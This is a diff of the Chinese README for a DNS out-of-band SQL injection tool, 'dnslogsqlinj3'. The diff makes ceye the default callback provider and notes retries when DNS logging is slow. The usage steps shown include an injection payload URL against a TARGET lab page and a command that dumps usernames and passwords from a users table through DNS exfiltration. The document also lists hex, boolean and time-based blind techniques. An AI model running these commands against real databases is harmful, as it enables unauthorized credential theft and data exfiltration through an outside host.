@@ -19,14 +19,14 @@ pip install . && dnslogsqlinj3 --help  # 或装成命令
 python3 dnslogsqlinj3.py --self-test
 
 # 2) 回调通道体检（领域名 → 探针解析 → 平台确认）
-python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --check
+python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --check
 
 # 3) 探路：确认注入点闭合正确
-python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
+python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --dbms mysql \
   --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" --expr "select 0x414243"
 
 # 4) 脱库
-python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
+python3 dnslogsqlinj3.py --token TOKEN --ident IDENT --dbms mysql \
   --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
   --expr "select group_concat(username,0x3a,password) from users"
 ```
@@ -38,6 +38,8 @@ python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysq
 | DNS HEX 带外（默认） | 直接跑 | 1 次搬 30 字节 | FILE 权限 + 出 DNS |
 | DNS 布尔 | `--blind` | 7 | FILE 权限 + 出 DNS |
 | SLEEP 时间盲注 | `--technique time` | 7 × samples | 只要 SQL 能跑 |
+
+默认 provider 就是 `ceye`（`--token` + `--ident`）。ceye 的 DNS 入库偶尔延迟到 30~60 秒，脚本会自动重投一次并打印等待心跳，不用干等。
 
 ## 支持
 
